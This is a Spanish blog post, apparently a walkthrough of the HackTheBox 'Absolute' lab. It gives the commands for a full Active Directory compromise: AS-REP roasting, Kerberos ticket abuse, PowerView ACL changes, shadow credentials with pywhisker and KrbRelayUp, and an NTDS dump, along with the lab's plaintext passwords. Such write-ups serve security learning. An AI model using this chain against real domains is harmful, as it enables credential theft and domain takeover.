---
layout      : post
title       : "Absolute - HackTheBox"
author      : elc4br4
image       : /assets/images/HTB/Absolute-HackTheBox/Absolute.webp
optimized_image : /assets/images/HTB/Absolute-HackTheBox/Absolute.webp
category    : [ htb ]
tags        : [ Windows ]
description : En esta ocasión me he metido en un jaleo resolviendo la máquina Absolute de HackTheBox de nivel Insane... Es una máquina bastante compleja pero la recomiendo si quieres aprender técnicas nuevas y terminar de asentar algunos conceptos.
---

En esta ocasión me he metido en un jaleo resolviendo la máquina Absolute de HackTheBox de nivel Insane... Es una máquina bastante compleja pero la recomiendo si quieres aprender técnicas nuevas y terminar de asentar algunos conceptos.

![](/assets/images/HTB/Absolute-HackTheBox/Absolute2.webp)

![](/assets/images/HTB/Absolute-HackTheBox/absolute-rating.webp)

**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Explotación](#explotación).
3. [Escalada de Privilegios](#privesc). 

# Reconocimiento [#](reconocimiento) {#reconocimiento}

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Comenzamos lanzando nmap como de costumbre para escanear los 65535 puertos existentes en busca de puertos abiertos.

`nmap -p- -pn -n --min-rate 5000 10.10.11.181 -oG puertos_absolute`

```r
❯ nmap -p- -Pn -n --min-rate 5000 10.10.11.181 -oG puertos_absolute
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-03 12:35 CET
Nmap scan report for 10.10.11.181
Host is up (0.12s latency).
Not shown: 65386 filtered tcp ports (no-response), 144 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49685/tcp open  unknown
49691/tcp open  unknown
49698/tcp open  unknown
49702/tcp open  unknown
62849/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 60.55 seconds
```

Encuentro varios puertos abiertos en la máquina pero no me arrojan mucha información, por lo que lanzo un comando un poco más avanzado que lanza una serie de scripts básicos de nmap y para obtener los servicios que corren en cada puerto y sus versiones.

```r
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49685,49691,49698,49702,62849 -sCV -n -Pn 10.10.11.181 -oN servicios_absolute
```

```r
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-03 18:46:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-03-03T18:47:07+00:00; +6h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-03-03T18:47:06+00:00; +6h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-03-03T18:47:07+00:00; +6h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-03-03T18:47:06+00:00; +6h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
62849/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-03T18:46:59
|_  start_date: N/A
```

Parece que estamos ante un DC y de hecho encontramos el dominio que he de añadir al archivo hosts.

`dc.absolute.htb absolute.htb`

Winrm está abierto por lo que será de utilidad más tarde.

Para comenzar lo primero que hago es recopilar algo de información con crackmapexec.

```bash
❯ crackmapexec smb absolute.htb
SMB         10.10.11.181    445    DC    [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
```

Podemos ver que estamos ante una máquina *Windows 10*, podemos ver el dominio y que el *smb está firmado*, por lo que descarto el poder usar *responder* en algún momento.

Continuaré enumerando un poco el servidor web en busca de pistas por donde poder tirar.

# Explotación [#](explotación) {#explotación}

Accedo al servidor web y encuentro lo siguiente.

![](/assets/images/HTB/Absolute-HackTheBox/2.webp)

Aparentemente no hay nada que me llame la atención, salvo las imágenes que analizaré a continuación, pero antes decidí fuzzear un poco en busca de rutas.

![](/assets/images/HTB/Absolute-HackTheBox/3.webp)

Aparentemente no hay nada por lo que me descargo las imágenes que vi al acceder al servidor web.

```bash
for i in {1..10}; do wget "http://absolute.htb/images/hero_$i.jpg" &>/dev/null; done
```

![](/assets/images/HTB/Absolute-HackTheBox/4.webp)

A continuación las analizo con exiftool en busca de algún dato que me pueda servir.

Tras analizar una de ellas vi que el campo `author` tiene lo que podría ser un usuario por lo que analizo todas las imágenes filtrando por el campo `author`.

![](/assets/images/HTB/Absolute-HackTheBox/5.webp)

Obtengo una lista de usuarios que me copio y modifico para adaptarla a los tipos de usuarios que suele haber en AD.

Y quedaría de esta forma:

![](/assets/images/HTB/Absolute-HackTheBox/6.webp)

A continuación podría usar esta lista de usuarios con kerbrute (ya que el puerto 88 esta abierto) y comprobar si alguno de la lista es válido.

![](/assets/images/HTB/Absolute-HackTheBox/7.webp)

Tras lanzar el kerbrute veo que existen varios usuarios válidos por lo que el siguiente paso será comprobar si alguno de estos usuarios es vulnerable a kerberos o asreproast.

Primero voy a comprobar si es vulnerable a asreproast usando la herramienta GetNPUsers de la suite impacket.

`impacket-GetNPUsers absolute.htb/ -no-pass -usersfile usuarios.txt`

![](/assets/images/HTB/Absolute-HackTheBox/8.webp)

Como se puede ver el usuario d.klay es vulnerable y obtengo el hash que voy a craquear a continuación haciendo uso de la herramienta John The Ripper.

![](/assets/images/HTB/Absolute-HackTheBox/9.webp)

Al obtener las credenciales intento probarlas con crackmapexec para saber si podré enumerar los recursos comapartidos en la máquina.

```r
❯ crackmapexec smb absolute.htb -u 'd.klay' -p 'Darkmoonsky248girl'
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```

Pero no puedo, eso me hace pensar que es probable que solo se pueda usar el protocolo kerberos para autenticarnos, por lo que como último recurso se me ocurre solicitar un TGT válido con las credenciales que ya tengo para poder ganar más acceso.

Para el TGT usaré la utilidad `getTGT.py` de la suite impacket.

![](/assets/images/HTB/Absolute-HackTheBox/10.webp)

Ahora que ya tengo el ticket he de exportarlo a la variable KRB5CCNAME.

`export KRB5CCNAME=/ruta/absoluta/d.klay.ccache`

Ahora que lo hemos conseguido y exportado a la variable no podemos acceder aún a enumerar recursos pero si podríamos enumerar un poco a través de ldap y sacar usuarios.

Para obtener la lista de usuarios a través de ldap usando la autenticación de kerberos debemos usar crackmapexec, pero antes debemos lanzar otro comando para sincronizar la hora con la de la máquina víctima, si no lo haces te saltará un error en la obtención de los usuarios.

`sudo ntpdate  10.10.11.181`

Y ya lanzamos el crackmapexec.

![](/assets/images/HTB/Absolute-HackTheBox/11.webp)

Y encontramos lo que parece ser una contraseña del usuario svc_smb con el que es probable que pueda acceder a los recursos compartidos por smb.

svc_smb:AbsoluteSMBService123!

Pero para poder continuar recordemos que el único método de autenticación que nos funcionaba era a través de kerberos por lo que he de conseguir el TGT para el usuario svc_smb.

![](/assets/images/HTB/Absolute-HackTheBox/12.webp)

Una vez lo tenemos usaré crackmapexec para comprobar si de verdad tendré acceso a los recursos compartidos.

```r
❯ cme smb dc.absolute.htb -k --kdcHost dc.absolute.htb
SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\svc_smb 
```
Y como se puede ver, tengo acceso asique empleo el mismo comando pero añadiendo --shares al final para listar todos los recursos.

![](/assets/images/HTB/Absolute-HackTheBox/13.webp)

Ahí puedo ver a que recursos tengo acceso, por lo que a través de `smbclient` puedo conectarme a ellos, recordemos usar la autenticación de kerberos.

![](/assets/images/HTB/Absolute-HackTheBox/14.webp)

Me descargo los los archivos que veo para analizar a continuación.

El archivo `compiler.sh` no tiene nada que me pueda servir para continuar por lo que decido pasar a mi máquina Windows para analizar el archivo .exe.

![](/assets/images/HTB/Absolute-HackTheBox/15.webp)

Pero antes de nada lo ejecuto para ver que sucede.

![](/assets/images/HTB/Absolute-HackTheBox/16.webp)

Pero al ejecutarlo no sucede nada por lo que abro wireshark por si es posible que se envíe data o algo parecido.

![](/assets/images/HTB/Absolute-HackTheBox/17.webp)

Y encuentro credenciales --> m.lovegod:AbsoluteLDAP2022!

Ahora al tener credenciales genero de nuevo otro TGT y posteriormente lanzaré bloodhound para enumerar el dominio y buscar posibles vectores de acceso.

![](/assets/images/HTB/Absolute-HackTheBox/18.webp)

Una vez lo tengo lanzo bloodhound.py y se me generarán archivos json que importaré después.

![](/assets/images/HTB/Absolute-HackTheBox/19.webp)

Importo los archivos json en bloodhound y analizo las rutas más cortas desde el usuario m.lovegod del que tengo credenciales hasta el usuario Administrador.

![](/assets/images/HTB/Absolute-HackTheBox/20.webp)

Como podemos ver en la imágen tenemos un usuario de por medio llamado WINRM_USER con el que es muy probable que pueda acceder a la máquina y ya desde ahí escalar privilegios.

* El usuario m.lovegod es dueño del grupo Network Audit al que debemos pertenecer para posteriormente migrarnos al usuario WINRM.

Para poder unirnos a este grupo debemos realizar varias cosas:

* Importar el módulo Powerview.ps1 y ejecutar los comandos que BloodHound nos ofrece para unirnos a este grupo.

![](/assets/images/HTB/Absolute-HackTheBox/21.webp)

Descargamos y pasamos a la máquina el módulo Powerview.ps1, en mi caso lo haré usando un servidor python3 desde mi máquina atacante y desde la máquina Windows lo descargaré con certutil.

Una vez estamos en la máquina Windows debemos realizar varios cambios:

* En mi caso instalé un Windows Server 2019 con el rol de AD (sin configurar nada más)
* Añadir la ip de la máquina víctima (10.10.11.181) a la configuración de red en el apartado DNS.
* Editar el archivo hosts añadiendo la ip y el dominio absolute.htb (el dc.absolute.htb no hay que añadirlo)
* Sincronizar la hora del Windows Server con la del dominio dc.absolute.htb
* Ejecutar estos comandos a través de una powershell.


```powershell
Import-Module .\PowerView.ps1 
$SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("Absolute.htb\m.lovegod", $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController dc.absolute.htb -PrincipalIdentity "m.lovegod"
Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $Cred -server dc.absolute.htb
```

![](/assets/images/HTB/Absolute-HackTheBox/22.webp)

Una vez que hemos lanzado estos comandos en la powershell debemos ir **rápidamente** a nuestra máquina atacante para ejecutar el siguiente comando.

```bash
❯ sudo python3 pywhisker.py -d absolute.htb -u "m.lovegod" -k --no-pass -t "winrm_user" --action "add"
```

![](/assets/images/HTB/Absolute-HackTheBox/23.webp)

Al ejecutar este comando se nos genera un certificado con extensión .pfx y su contraseña.

De esta forma usamos el certificado *.pfx* para generar un TGT del usuario winrm_user a través de la utilidad gettgtpkinit.py.

Ejecuto el siguiente comando introduciendo todos los parámetros necesarios, tales como el certificado .pfx, la contraseña, dominio...

```bash
❯ python3 gettgtpkinit.py absolute.htb/winrm_user -cert-pfx /home/elc4br4/Absolute/pywhisker/JVtdjRsp.pfx -pfx-pass lHFYqVyq8kijBRwgof8D winrmCcache
```

![](/assets/images/HTB/Absolute-HackTheBox/24.webp)

Y ya tenemos el TGT del usuario winrm_user, por lo que lo exportamos a la variable KRB5CCNAME

`export KRB5CCNAME=/home/elc4br4/PKINITtools/winrmCcache`

Y ahora ya podemos conectarnos a la máquina a través de Winrm con este usuario.

`ruby evil-winrm.rb -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB`

![](/assets/images/HTB/Absolute-HackTheBox/25.webp)

Ahora el siguiente paso es Escalar Privilegios.

# Escalada de Privilegios [#](privesc) {#privesc}

Antes de comenzar a hacer nada debemos saber que solo existe un Administrador del dominio y que ya estamos en el DC por lo que si conseguimos escalar privilegios seremos Administradores del AD y podremos realizar un volcado del NTDS.

De esta forma podríamos usar este hash NTLM para conectarnos como Administrador.

Tras probar diferentes métodos encontré que podemos escalar privilegios a través de kerberos usando KrbRelayUp con el método ShadowCred.

Necesitaremos las herramientas `KrbRelayUp, Rubeus y RunasCS`.

Tras descargarlas, compilarlas y subirlas a la máquina debemos ejecutar una serie de comandos.

* El primer paso es generar y agregar una credencial oculta mediante krbrelayup.

```bash
./RunasCs-cc.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 "/path/to/Krbrelayup.exe" -m shadowcred -cls {CLS}
```

![](/assets/images/HTB/Absolute-HackTheBox/1.1.webp)

Al ejecutar el comando obtenemos un certificado y la contraseña del mismo que usaremos a continuación para generar un TGT con Rubeus como DC$ y así obtener el hash NTLM.

![](/assets/images/HTB/Absolute-HackTheBox/1.3.webp)

Una vez tenemos el hash NTLM lo usamos para volcar el ntds con crackmapexec.

![](/assets/images/HTB/Absolute-HackTheBox/ntds.webp)

Y una vez tenemos el volcado listo usamos el hash para conectarnos a través de winrm como el usuario Administrador y podremos leer la flag root.txt

![](/assets/images/HTB/Absolute-HackTheBox/fin.webp)




